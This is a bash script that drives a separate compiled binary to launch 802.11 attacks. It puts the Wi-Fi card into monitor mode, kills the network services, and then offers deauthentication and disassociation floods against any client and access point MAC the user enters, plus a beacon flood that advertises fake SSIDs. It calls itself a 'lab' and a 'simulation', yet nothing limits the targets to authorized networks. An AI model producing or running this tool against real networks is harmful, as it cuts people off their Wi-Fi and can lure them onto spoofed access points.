#!/bin/bash

# Ensure the script runs with root privileges
if [ "$EUID" -ne 0 ]; then
    echo "[-] Error: This script must be run with 'sudo'."
    exit 1
fi

# --- 1. AUTOMATIC WI-FI INTERFACE DISCOVERY ---
# Locates the first active physical wireless interface card on the laptop
WIFI_INT=$(iw dev | awk '/Interface/ {print $2; exit}')

if [ -z "$WIFI_INT" ]; then
    echo "[-] Error: No physical Wi-Fi interface detected on this machine."
    exit 1
fi

# Cleanup/Restoration Function
cleanup() {
    echo -e "\n------------------------------------------------------------------"
    echo "[*] Shutting down simulation engines safely..."
    echo "[*] Restoring physical interface $WIFI_INT back to Managed Mode..."
    ip link set "$WIFI_INT" down &>/dev/null
    iw "$WIFI_INT" set type managed &>/dev/null
    ip link set "$WIFI_INT" up &>/dev/null

    echo "[*] Restarting native system network daemons..."
    systemctl start NetworkManager &>/dev/null
    systemctl start wpa_supplicant &>/dev/null
    echo "[+] Success: Laptop network stack fully restored. Internet is back online."
    echo "=================================================================="
}

# --- DIRECT RESTORE COMMAND OPTION ---
if [ "$1" == "--restore" ] || [ "$1" == "restore" ] || [ "$1" == "-r" ]; then
    cleanup
    exit 0
fi

# Ensure your compiled wireless binary exists in the current directory
BINARY_PATH="./wifi_engine"
if [ ! -f "$BINARY_PATH" ]; then
    echo "[-] Error: '$BINARY_PATH' not found. Please compile wifi_flood.cpp first."
    exit 1
fi

clear
echo "=================================================================="
echo "          AUTOMATED WIRELESS LAYER 2 LAB ORCHESTRATOR             "
echo "=================================================================="
echo "[*] Detected Physical Interface : $WIFI_INT"

# --- 2. TERMINATE CONFLICTING SERVICES ---
echo "[*] Cleaning network management locks (NetworkManager / wpa_supplicant)..."
# Register cleanup trap to restore network on exit or interrupt
trap cleanup EXIT INT TERM

# airmon-ng check kill logic natively written to prevent interface mode switching back
systemctl stop NetworkManager &>/dev/null
systemctl stop wpa_supplicant &>/dev/null
pkill -f wpa_supplicant &>/dev/null
pkill -f dhclient &>/dev/null
sleep 1

# --- 3. HARDWARE MONITOR MODE RECONFIGURATION ---
echo "[*] Flipping $WIFI_INT into raw Monitor Mode..."
ip link set "$WIFI_INT" down
iw "$WIFI_INT" set type monitor
ip link set "$WIFI_INT" up

# Double check if interface successfully changed type
CURRENT_MODE=$(iw dev "$WIFI_INT" info | awk '/type/ {print $2}')
if [ "$CURRENT_MODE" != "monitor" ]; then
    echo "[-] Error: Failed to set $WIFI_INT to monitor mode. Hardware may be locked."
    exit 1
fi
echo "[+] Status: Monitor Mode Enabled Successfully!"
echo "------------------------------------------------------------------"

# --- 4. INTERACTIVE VECTOR RECRUITMENT ---
echo "Select your wireless simulation attack vector:"
echo "  1) Deauthentication Flood (Target Client Connectivity)"
echo "  2) Disassociation Flood  (Target Authentication Link State)"
echo "  3) Beacon Flood          (Target Wireless Scanning Menus)"
echo "  4) Exit and Restore Managed Mode"
read -rp "Enter choice [1-4]: " VECTOR_CHOICE

case $VECTOR_CHOICE in
    1)
        read -rp "Enter Target Client MAC (AA:BB:CC:DD:EE:FF): " TARGET_MAC
        read -rp "Enter Router AP MAC      (AA:BB:CC:DD:EE:FF): " AP_MAC
        echo "------------------------------------------------------------------"
        $BINARY_PATH "$WIFI_INT" deauth "$TARGET_MAC" "$AP_MAC"
        ;;
    2)
        read -rp "Enter Target Client MAC (AA:BB:CC:DD:EE:FF): " TARGET_MAC
        read -rp "Enter Router AP MAC      (AA:BB:CC:DD:EE:FF): " AP_MAC
        echo "------------------------------------------------------------------"
        $BINARY_PATH "$WIFI_INT" disassoc "$TARGET_MAC" "$AP_MAC"
        ;;
    3)
        read -rp "Enter Target SSID Name  (e.g., FREE_AIRPORT_WIFI): " SSID_NAME
        echo "------------------------------------------------------------------"
        $BINARY_PATH "$WIFI_INT" beacon "$SSID_NAME"
        ;;
    4)
        echo "[*] User requested exit before running simulation."
        exit 0
        ;;
    *)
        echo "[-] Invalid selection. Aborting lab."
        exit 1
        ;;
esac
